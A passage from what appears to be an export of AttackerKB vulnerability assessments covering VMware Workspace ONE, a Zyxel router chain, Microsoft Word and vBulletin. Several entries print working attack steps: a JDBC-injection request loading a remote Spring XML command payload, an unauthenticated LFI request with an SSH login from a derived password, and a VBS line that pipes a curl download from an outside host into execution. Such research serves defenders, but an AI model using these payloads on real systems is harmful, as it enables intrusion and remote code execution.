          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "a515f2e1-0339-4000-8e79-586509bd2025",
      "editorId": "de2686f1-1a8a-4518-8379-12188d859523",
      "topicId": "53b25387-aa2f-4e57-8a07-d68126f5fa2b",
      "created": "2023-04-11T19:46:56.325647Z",
      "revisionDate": "2023-04-13T14:19:45.138111Z",
      "document": "This is an authenticated remote code execution vulnerability which gives access in the context of the `horizon` user however authentication can easily be by-passed with [CVE-2022-22956](https://attackerkb.com/topics/9cBadNLVz8/cve-2022-22956?referrer=search).  The list of affected products and corresponding versions are:\r\n\r\n| Vulnerable Application  | Vulnerable version   |  \r\n|---|---|  \r\n| VMware Workspace ONE Access (Access)   |  21.08.0.1, 21.08.0.0, 20.10.0.1, 20.10.0.0  |  \r\n| VMware Identity Manager (vIDM)  |  3.3.6, 3.3.5, 3.3.4, 3.3.3  |  \r\n| VMware vRealize Automation (vRA)  |  8.x, 7.6  |  \r\n| VMware Cloud Foundation | 4.x | | vRealize Suite Lifecycle Manager| 8.x |\r\n\r\n## Reason for Exploitability & Attacker Value rating.\r\n\r\nAs mentioned in my write up for [CVE-2022-22956](https://attackerkb.com/topics/9cBadNLVz8/cve-2022-22956?referrer=search) this vulnerability was bundled up [VMSA-2022-0011](https://www.vmware.com/security/advisories/VMSA-2022-0011.html) along with 8 other CVEs.  Out of all the CVEs in this advisory [CVE-2022-22954](https://attackerkb.com/topics/BDXyTqY1ld/cve-2022-22954/rapid7-analysis?referrer=search) really stole the show as it was an unauth RCE. Not as many paid much mind to this CVE + [CVE-2022-22956](https://attackerkb.com/topics/9cBadNLVz8/cve-2022-22956?referrer=search) (authentication by-pass) which when combined together with [CVE-2022-22960](https://attackerkb.com/topics/E62D0oFo6u/cve-2022-22960?referrer=search) (LPE) gives attackers yet another exploitation path to unauthenticated RCE as root. \r\n\r\n## How it works\r\n\r\nThis vulnerability abuses the `dbCheck` method inside the `com.vmware.horizon.rest.controller.system.DBConnectionCheckController` class.  The method accepts an attacker controlled parameter `jdbcUrl` which gets passed through a string of method calls until it eventually reaches \u00a0a `DriverManager.getConnection`\u00a0sink which will lead to an arbitrary JDBC URI connection.\r\n\r\nRemote code execution can be achieved through the `socketFactory` property of the PostgreSQL JDBC driver. An attacker can set the `socketFactory` and `socketFactoryArg` properties in order to trigger the execution of a constructor defined in an arbitrary Java class with a controlled string argument. Due to the fact VMware Workspace One uses Spring with a PostgreSQL database `FileSystemXmlApplicationContext` can be used.\r\n\r\nThe attacker sends a `POST` request to the following URI: `/SAAS/API/1.0/REST/system/dbCheck` with the following data:\r\n`jdbc:postgresql://localhost:1337/saas?socketFactory=org.springframework.context.support.FileSystemXmlApplicationContext&socketFactoryArg=http://#{attacker-ip-address}:#{attacker-port-hosting-malicious-file}/#{filename}`\r\n\r\nWhile hosting the following file:\r\n```\r\n<beans xmlns=\"[http://www.springframework.org/schema/beans](http://www.springframework.org/schema/beans)\" xmlns:xsi=\"[http://www.w3.org/2001/XMLSchema-instance](http://www.w3.org/2001/XMLSchema-instance)\" xsi:schemaLocation=\"[http://www.springframework.org/schema/beans](http://www.springframework.org/schema/beans) [http://www.springframework.org/schema/beans/spring-beans.xsd](http://www.springframework.org/schema/beans/spring-beans.xsd)\">\r\n  <bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\">\r\n    <constructor-arg>\r\n      <list>\r\n        <value>touch</value>\r\n        <value>/tmp/rce</value>\r\n      </list>\r\n    </constructor-arg>\r\n  </bean>\r\n</beans>\r\n```\r\n\r\nThe above file will be downloaded by the victim and the command in side the `constructor-arg` will be executed in the context of the horizon user. \r\n\r\n## References:\r\nhttps://srcincite.io/blog/2022/08/11/i-am-whoever-i-say-i-am-infiltrating-vmware-workspace-one-access-using-a-0-click-exploit.html#dbconnectioncheckcontroller-dbcheck-jdbc-injection-remote-code-execution\r\n",
      "score": 3,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "88c39518-d367-4110-8435-7952df34a16f",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "f476d653-9f2a-4d0d-859a-4a4b034a9a34",
      "created": "2023-04-12T15:18:47.743315Z",
      "revisionDate": "2023-04-13T14:19:42.43486Z",
      "document": "This was discovered because of zero-day exploitation perpetrated by a skilled adversary \u2014 final payload was Nokoyawa ransomware in at least one case, as [Kaspersky details here](https://securelist.com/nokoyawa-ransomware-attacks-with-windows-zero-day/109483/). We've seen a sustained burst of [driver exploitation](https://www.rapid7.com/blog/post/2021/12/13/driver-based-attacks-past-and-present/) by a range of threat actors the past two years. The trend continues.  \r\n\r\nPatched in April 2023 Patch Tuesday, so grab those updates quickly as always!",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        }
      ]
    },
    {
      "id": "fbe6c66d-9f1e-45c0-b1bf-34ed01017ea3",
      "editorId": "8a465efa-5959-4307-868a-5c6bd2f9fdc9",
      "topicId": "f567cbf9-5873-48f3-a01f-dd1a0d02eb9f",
      "created": "2023-04-14T08:18:36.370289Z",
      "revisionDate": "2023-04-28T01:23:39.328743Z",
      "document": "In December 2022,  `SEC Consult` released a blog with the title [The enemy from within: Unauthenticated Buffer Overflows in Zyxel routers still haunting users ](https://sec-consult.com/blog/detail/enemy-within-unauthenticated-buffer-overflows-zyxel-routers/). The blog explains an unauthenticated buffer overflow in more then 40 different Zyxel router models and the fast amount of thousands of routers that are vulnerable and accessible via the Internet.\r\nThe impact is still quite limited because the published [Metasploit exploit module](https://github.com/rapid7/metasploit-framework/pull/17388) only works from the LAN side.\r\n\r\nHowever, the **Unauthenticated Buffer Overflow** is not the only vulnerability on these routers and `SEC Consult` discovered another 7 vulnerabilities that are described in their security analysis [Multiple Critical Vulnerabilities in multiple Zyxel devices](https://sec-consult.com/vulnerability-lab/advisory/multiple-critical-vulnerabilities-in-multiple-zyxel-devices/).\r\nWhile reading the security analysis and reviewing the other vulnerabilities, I discovered a new opportunity to build an exploit by chaining two other vulnerabilities that will allow an unauthenticated attacker to get privileged access to the Zyxel router from either the WAN or LAN side. The potential of this exploit to attack from the WAN side makes it quite dangerous taking into account the large number of non-patched Zyxel routers out there on the Internet.\r\n\r\nRecently, [CVE-2023-28770](https://www.tenable.com/cve/CVE-2023-28770) has been released covering the LFI vulnerability that is used in this  chained exploit.\r\n\r\n## Zyxel router chained RCE \r\n### Exploiting an unauthenticated  local file disclosure (LFI) vulnerability and a weak password derivation algorithm\r\nThe first vulnerability that stood out to me is the LFI vulnerability that is discussed in section 2 of the [Security Analysis by SEC Consult](https://sec-consult.com/vulnerability-lab/advisory/multiple-critical-vulnerabilities-in-multiple-zyxel-devices/).\r\nThe LFI vulnerability is present in the `zhttp` binary that allows an unauthenticated attacker to read the entire configuration of the router via the vulnerable endpoint `/Export_Log?/data/zcfg_config.json`.\r\n\r\nThe burp request below shows a redacted response of the information that is disclosed such as encrypted passwords, account information, information on services configuration (FTP, Telnet, SSH), and hardware details such as serial number, hardware model etc. In total around 4000 lines of nested `JSON` information that you would not like to share with anyone out there.\r\n \r\n**LFI Burp request and response**\r\n```\r\nGET /Export_Log?/data/zcfg_config.json HTTP/1.1\r\nHost: zyxel-vuln-router:8080\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36\r\nConnection: close\r\n```\r\n**Response (REDACTED)**\r\n```json\r\nHTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: 148678\r\nDate: Fri, 14 Apr 2023 08:47:46 GMT\r\nX-Frame-Options: sameorigin\r\nContent-Security-Policy: frame-ancestors 'self'\r\n\r\n---- Hardware Information ----\r\n{\r\n    \"Manufacturer\":\"ZYXEL\",\r\n    \"ManufacturerOUI\":\"XXXXX\",\r\n    \"ModelName\":\"VMG3625-T20A\",\r\n    \"Description\":\"Wireless AC VDSL2 4-port Gateway with USB\",\r\n    \"ProductClass\":\"VMG3625-T20A\",\r\n    \"SerialNumber\":\"SXXXXXXXXXXXX\",\r\n    \"SoftwareVersion\":\"V5.30(ABOU.2)b1_I0_20180821\",\r\n    \"AdditionalHardwareVersion\":\"\",\r\n    \"AdditionalSoftwareVersion\":\"\",\r\n    \"UpTime\":607055,\r\n    \"FirstUseDate\":\"2023-03-21T09:07:41\",\r\n    \"VendorConfigFileNumberOfEntries\":0,\r\n    \"SupportedDataModelNumberOfEntries\":0,\r\n    \"ProcessorNumberOfEntries\":0,\r\n    \"VendorLogFileNumberOfEntries\":0,\r\n    \"LocationNumberOfEntries\":0,\r\n    \"FixManufacturerOUI\":\"\"\r\n  },\r\n\r\n---- Account Information----\r\n\"X_ZYXEL_LoginCfg\":{\r\n    \"LoginGroupConfigurable\":true,\r\n    \"LogGp\":[\r\n      {\r\n        \"GP_Privilege\":\"_encrypt_XXXXXXXXXXXXXX\",\r\n        \"Account\":[\r\n          {\r\n            \"AutoShowQuickStart\":false,\r\n            \"Enabled\":true,\r\n            \"EnableQuickStart\":true,\r\n            \"Page\":\"\",\r\n            \"Username\":\"root\",\r\n            \"Password\":\"\",\r\n            \"PasswordHash\":\"\",\r\n            \"Privilege\":\"_encrypt_XXXXXXXXXXXXX\",\r\n            \"GetConfigByFtp\":true,\r\n            \"DefaultPassword\":\"_encrypt_XXXXXXXXXXXXXX\",\r\n            \"DefaultGuiPassword\":\"\",\r\n            \"ResetDefaultPassword\":false,\r\n            \"shadow\":\"root:$6$XXXXXXXXXXX:0::::::\\n\",\r\n            \"smbpasswd\":\"root:0:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:33A9D53C23525B5F63A0C536445E2B76:[U          ]:LCT-0000004E:\\n\",\r\n            \"ConfigAccountFromWAN\":false,\r\n            \"DefPwLength\":8,\r\n            \"AccountCreateTime\":0,\r\n            \"AccountRetryTime\":3,\r\n            \"AccountIdleTime\":300,\r\n            \"AccountLockTime\":300,\r\n            \"RemoHostAddress\":\"\",\r\n            \"DotChangeDefPwd\":false,\r\n            \"ShowSkipBtnInChgDefPwdPage\":false,\r\n            \"AutoGenPwdBySn\":false,\r\n            \"RemoteAccessPrivilege\":\"LAN\",\r\n            \"OldDefaultPassword\":\"\",\r\n            \"CardOrder\":\"\",\r\n            \"ThemeColor\":\"\",\r\n            \"HiddenPage\":\"\"\r\n          },\r\n          {\r\n            \"AutoShowQuickStart\":false,\r\n            \"Enabled\":true,\r\n            \"EnableQuickStart\":true,\r\n            \"Page\":\"\",\r\n            \"Username\":\"supervisor\",\r\n            \"Password\":\"\",\r\n            \"PasswordHash\":\"\",\r\n            \"Privilege\":\"_encrypt_XXXXXXXXXXX\",\r\n            \"DefaultPassword\":\"_encrypt_XXXXXXXXXXX\",\r\n            \"DefaultGuiPassword\":\"\",\r\n            \"ResetDefaultPassword\":false,\r\n            \"shadow\":\"supervisor:$6$XXXXXXXXXX:0::::::\\n\",\r\n            \"smbpasswd\":\"supervisor:12:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:33A9D53C23525B5F63A0C536445E2B76:[U          ]:LCT-0000004E:\\n\",\r\n            \"ConfigAccountFromWAN\":false,\r\n            \"DefPwLength\":8,\r\n            \"AccountCreateTime\":0,\r\n            \"AccountRetryTime\":3,\r\n            \"AccountIdleTime\":300,\r\n            \"AccountLockTime\":300,\r\n            \"RemoHostAddress\":\"\",\r\n            \"DotChangeDefPwd\":false,\r\n            \"ShowSkipBtnInChgDefPwdPage\":false,\r\n            \"AutoGenPwdBySn\":false,\r\n            \"RemoteAccessPrivilege\":\"LAN\",\r\n            \"OldDefaultPassword\":\"\",\r\n            \"CardOrder\":\"\",\r\n            \"ThemeColor\":\"\",\r\n            \"HiddenPage\":\"\"\r\n          }\r\n        ],\r\n        \"Level\":\"high\"\r\n      },\r\n\r\n---- Service Information ----\r\n  \"X_ZYXEL_RemoteManagement\":{\r\n    \"Service\":[\r\n      {\r\n        \"Name\":\"HTTP\",\r\n        \"Enable\":true,\r\n        \"Protocol\":6,\r\n        \"Port\":8080,\r\n        \"Mode\":\"LAN_WAN\",\r\n        \"TrustAll\":true,\r\n        \"OldMode\":\"LAN_ONLY\",\r\n        \"RestartDeamon\":1,\r\n        \"LifeTime\":20,\r\n        \"BoundInterfaceList\":\"\"\r\n      },\r\n      {\r\n        \"Name\":\"HTTPS\",\r\n        \"Enable\":true,\r\n        \"Protocol\":6,\r\n        \"Port\":443,\r\n        \"Mode\":\"LAN_WAN\",\r\n        \"TrustAll\":true,\r\n        \"OldMode\":\"LAN_ONLY\",\r\n        \"RestartDeamon\":true,\r\n        \"LifeTime\":20,\r\n        \"BoundInterfaceList\":\"\"\r\n      },\r\n      {\r\n        \"Name\":\"FTP\",\r\n        \"Enable\":true,\r\n        \"Protocol\":6,\r\n        \"Port\":21,\r\n        \"Mode\":\"LAN_WAN\",\r\n        \"TrustAll\":true,\r\n        \"OldMode\":\"LAN_ONLY\",\r\n        \"RestartDeamon\":true,\r\n        \"LifeTime\":20,\r\n        \"BoundInterfaceList\":\"\"\r\n      },\r\n      {\r\n        \"Name\":\"TELNET\",\r\n        \"Enable\":true,\r\n        \"Protocol\":6,\r\n        \"Port\":23,\r\n        \"Mode\":\"LAN_WAN\",\r\n        \"TrustAll\":true,\r\n        \"OldMode\":\"LAN_ONLY\",\r\n        \"RestartDeamon\":true,\r\n        \"LifeTime\":20,\r\n        \"BoundInterfaceList\":\"\"\r\n      },\r\n      {\r\n        \"Name\":\"SSH\",\r\n        \"Enable\":true,\r\n        \"Protocol\":6,\r\n        \"Port\":22,\r\n        \"Mode\":\"LAN_WAN\",\r\n        \"TrustAll\":true,\r\n        \"OldMode\":\"LAN_ONLY\",\r\n        \"RestartDeamon\":true,\r\n        \"LifeTime\":20,\r\n        \"BoundInterfaceList\":\"\"\r\n      },\r\n```\r\nNow this information disclosure in itself will not pose a direct threat to these routers, but of course attackers could try to crack the obtained encrypted shadow passwords, but this will take a long time.\r\n\r\nSo is there any other way to use the disclosed information for a successful attack?\r\n And of course the answer is `YES!`\r\n\r\nThe second vulnerability that comes into play is the vulnerability described in section 3 of the analysis, **\"Unsafe Storage of Sensitive Data\"**. \r\nIt explains the password derivation technique used to decrypt the `_encrypted_XXXXXX` passwords in the `JSON` configuration file using a static `AES Key and IV`.\r\nBut my attention was more drawn to another analysis [Getting root on a Zyxel VMG8825-T50 router](https://th0mas.nl/2020/03/26/getting-root-on-a-zyxel-vmg8825-t50-router/) done by `Thomas Rinsma` in 2020 that was referenced at the bottom of the section and where Thomas explains the password derivation techniques used on Zyxel routers.\r\nIn particular, section **\"Tangent 2: key and password derivation mechanisms\"** is quite interesting which describes in detail how the `supervisor` user password can be derived using the serial key of the router.\r\n\r\nSo what if we use the LFI vulnerability to get the serial key of the router and try to crack the `supervisor` password using this password derivation technique. \r\nWe can then use the disclosed router services information  to check if `ssh` or `telnet` is enabled and accessible from the WAN and try to login as `supervisor` to gain access to the router.\r\n\r\n`Bogi Napoleon Wennerstr\u00f8m` has reverse engineered and implemented  some of these derivation functions producing the `supervisor` password.\r\nHis repository can be found [here](https://github.com/boginw/zyxel-vmg8825-keygen) on Github.\r\nI tested his password derivation functions and indeed I can confirm that either `zcfgBeCommonGenKeyBySerialNumMethod2` or `zcfgBeCommonGenKeyBySerialNumMethod3` are working on vulnerable Zyxel routers.\r\n\r\n```console\r\n# python ./main.py SXXXXXXXXXXXX <= redacted\r\nzcfgBeCommonGenKeyBySerialNum                   : L8PBA3JD6H\r\nzcfgBeCommonGenKeyBySerialNum_CBT               : 4a88dfa2\r\nzcfgBeCommonGenKeyBySerialNumMethod2            : 4a88dfa2\r\n=> zcfgBeCommonGenKeyBySerialNumMethod3         : aN66Q5D31Y <=\r\nzcfgBeCommonGenKeyBySerialNumConfigLength(1)    : 778V3W7O\r\nzcfgBeCommonGenKeyBySerialNumConfigLength(2)    : Yd3HvMpU\r\nzcfgBeCommonGenKeyBySerialNumConfigLength(3)    : dByHvMzZ\r\nzcfgBeCommonGenKeyBySerialNumConfigLengthOld(1) : 778V3W7O\r\nzcfgBeCommonGenKeyBySerialNumConfigLengthOld(2) : Yd3HvMpU\r\nzcfgBeCommonGenKeyBySerialNumConfigLengthOld(3) : dByHvMzZ\r\n\u250c\u2500\u2500(root\ud83d\udc80cuckoo)-[~/zyxel_exploit/zyxel-vmg8825-keygen]\r\n\u2514\u2500# ssh supervisor@zyxel-vuln-router\r\nsupervisor@zyxel-vuln-router's password:\r\n$ uname -a\r\nLinux VMG3625-T20A 2.6.36 #7 SMP Sat Aug 18 12:18:02 CET 2018 mips GNU/Linux\r\n$ \ufeffid\r\nuid=12(supervisor) gid=12 groups=12\r\n$\r\n```\r\nI have created a `Metasploit` module that chains these two vulnerabilities together to gain access to vulnerable Zyxel routers. \r\n[PR submission](https://github.com/rapid7/metasploit-framework/pull/17881) to mainstream `Metasploit` is in progress.\r\n\r\n### Mitigation\r\nPlease follow this [Security Advisory](https://www.zyxel.com/global/en/support/security-advisories/zyxel-security-advisory-for-multiple-vulnerabilities) of Zyxel to patch your router.\r\nAs temporary measure, you should disable all your services on the router such as `telnet`, `ftp` and `ssh` that allows access to the `supervisor` user and configure your web interface only to be accessible by the `admin` user.\r\n\r\n### References\r\n[CVE-2023-28770](https://www.tenable.com/cve/CVE-2023-28770)\r\n[The enemy from within: Unauthenticated Buffer Overflows in Zyxel routers still haunting users ](https://sec-consult.com/blog/detail/enemy-within-unauthenticated-buffer-overflows-zyxel-routers/).\r\n[Multiple Critical Vulnerabilities in multiple Zyxel devices](https://sec-consult.com/vulnerability-lab/advisory/multiple-critical-vulnerabilities-in-multiple-zyxel-devices/).\r\n[Getting root on a Zyxel VMG8825-T50 router](https://th0mas.nl/2020/03/26/getting-root-on-a-zyxel-vmg8825-t50-router/)\r\n[Zyxel VMG8825-T50 Supervisor Keygen - Github](https://github.com/boginw/zyxel-vmg8825-keygen) \r\n[Zyxel Security Advisory](https://www.zyxel.com/global/en/support/security-advisories/zyxel-security-advisory-for-multiple-vulnerabilities)\r\n[ Metasploit PR: Zyxel router chained RCE using LFI and weak password derivation algorithm](https://github.com/rapid7/metasploit-framework/pull/17881)\r\n\r\n### Credits\r\nCredits goes to:\r\n[SEC Consult team](https://sec-consult.com/contact/)\r\n[Thomas Rinsma] (https://www.linkedin.com/in/thomasrinsma)\r\n[Bogi Napoleon Wennerstr\u00f8m](https://github.com/boginw)\r\n\r\n\r\n\r\n",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "0e81e9fd-ca01-47ac-9d03-4c2a9c3f0860",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "d6549b30-31b6-4ac0-a8a6-d53b3d98348b",
      "created": "2023-04-14T10:39:13.634849Z",
      "revisionDate": "2023-05-02T09:35:46.737355Z",
      "document": "## [CVE-2023-28311-Microsoft-Word-Remote-Code-Execution-Vulnerability](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-28311)\r\n\r\n## [Vendor](https://www.microsoft.com/en-us/microsoft-365/word?activetab=tabs%3afaqheaderregion3)\r\n\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/2023/CVE-2023-28311/docs/Screenshot%202023-04-14%20122521.png)\r\n\r\n## Description:\r\nThe attack itself is carried out locally by a user with authentication to the targeted system. An attacker could exploit the vulnerability by convincing a victim, through social engineering, to download and open a specially crafted file from a website which could lead to a local attack on the victim's computer. The attacker can trick the victim to open a malicious web page by using a `Word` malicious file and he can steal credentials, and bank accounts information, sniffing and tracking all the traffic of the victim without stopping - it depends on the scenario and etc.\r\n\r\nSTATUS: HIGH Vulnerability\r\n\r\n[+]Exploit:\r\nThe exploit server must be BROADCASTING at the moment when the victim hit\r\nthe button of the exploit!\r\n\r\n```vbs\r\n  Call Shell(\"cmd.exe /S /c\" & \"curl -s\r\nhttp://tarator.com/ChushkI/ebanie.tarator | tarator\", vbNormalFocus)\r\n```\r\n\r\n## Reproduce:\r\n[href](https://github.com/nu11secur1ty/CVE-mitre/tree/main/2023/CVE-2023-28311)\r\n\r\n## Reference:\r\n[href](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-28311)\r\n\r\n[href](https://www.crowdstrike.com/cybersecurity-101/remote-code-execution-rce/)\r\n\r\n## Proof and Exploit\r\n[href](https://www.nu11secur1ty.com/2023/04/cve-2023-28311-microsoft-word-remote.html)\r\n\r\n## Time spend:\r\n01:00:00",
      "score": 0,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "be4e8671-741f-4410-963c-5b523dd6c8b4",
      "editorId": "38346220-4c55-4428-af6f-466a697194f3",
      "topicId": "812ed357-c31f-4733-afda-96facdd8a486",
      "created": "2023-04-15T19:34:16.104988Z",
      "revisionDate": "2023-04-17T23:42:20.031036Z",
      "document": "It's easy to weaponize, even manually but there are dozens of exploits available. There is a [TryHackMe room](https://tryhackme.com/room/cve202226134) about CVE-2022-26134 to practice in a lab environment.",
      "score": 3,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "9ea1b64d-2f86-4437-ac74-f4e6c924dd0e",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "72f3d320-e709-4f74-a6fc-42cdfdb3e843",
      "created": "2023-04-18T06:14:55.585135Z",
      "revisionDate": "2023-05-02T09:30:20.779385Z",
      "document": "## [CVE-2023-28285](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-28285)\r\n\r\n## [Vendor](https://www.microsoft.com/)\r\n\r\n## [Software](https://www.microsoft.com/en-us/microsoft-365/)\r\n\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/2023/CVE-2023-28285/docs/Screenshot%202023-04-17%20083324.png)\r\n\r\n## Description:\r\nThe attack itself is carried out locally by a user with authentication to the targeted system. An attacker could exploit the vulnerability by convincing a victim, through social engineering, to download and open a specially crafted file from a website which could lead to a local attack on the victim's computer. The attacker can trick the victim to open a malicious web page by using a malicious `Word` file for `Office-365 API`. After the user will open the file to read it, from the API of `Office-365`, without being asked what it wants to activate, etc, he will activate the code of the malicious server, which he will inject himself, from this malicious server. Emedietly after this click, the attacker can receive very sensitive information! For bank accounts, logs from some sniff attacks, tracking of all the traffic of the victim without stopping, and more malicious stuff, it depends on the scenario and etc.\r\n\r\nSTATUS: HIGH Vulnerability\r\n\r\n## Exploit information: \r\nThe exploit server must be BROADCASTING when the victim opens the infected file!\r\n\r\n## Proof and Exploit\r\n[href](https://www.nu11secur1ty.com/2023/04/cve-2023-28285-microsoft-office-remote.html)\r\n\r\n## Time spend:\r\n01:30:00",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "58145790-d0e0-4ef5-9c93-f3cca22ad076",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "91ec2353-d57c-4514-9719-c3770cabf738",
      "created": "2023-04-18T14:53:11.250111Z",
      "revisionDate": "2023-04-18T14:53:11.250254Z",
      "document": "## Overview\r\nThis is a pretty cool vulnerability in vBulletin version 5.6.9, 5.6.8 and 5.6.7 prior to PL1 for each respective version. The vulnerability occurs due to improper handing of non-scalar data in vBulletin's Object-Relational Mapper (ORM), which leads to deserialization of user input without appropriate validation.\r\n\r\nThere is a great writeup on this bug at https://www.ambionics.io/blog/vbulletin-unserializable-but-unreachable but I'll try summarize some of the important points here; I'd recommend reading the writeup though as its fairly short and to the point; something that is rare for a technical post of this nature.\r\n\r\nThe gist of what is going on here is that vBulletin stores non-scalar data in its database in a serialized format using functions like `serialize()`, and then will call `unserialize()` to unserialize that data when it needs to retrieve it from the database and use it. Each item to be serialized or deserialized will declare a 3 field structure stating its class, whether its a required field for that class, and a function to verify that the value is correct and modify it if necessary.\r\n\r\nThe researchers found that the `searchprefs` property of the `vB_DataManager_User` class is verified by the `verify_serialized()` function and is of type `vB_Cleaner::TYPE_NOCLEAN`, meaning it has no type restricitons. Looking at `verify_serialized()` we see the following code:\r\n\r\n```php\r\nfunction verify_serialized(&$data)\r\n{\r\n    if ($data === '')\r\n    {\r\n        $data = serialize(array());\r\n        return true;\r\n    }\r\n    else\r\n    {\r\n        if (!is_array($data))\r\n        {\r\n            $data = unserialize($data); // <--------- PROBLEM HERE!!!!\r\n            if ($data === false)\r\n            {\r\n                return false;\r\n            }\r\n        }\r\n\r\n        $data = serialize($data);\r\n    }\r\n\r\n    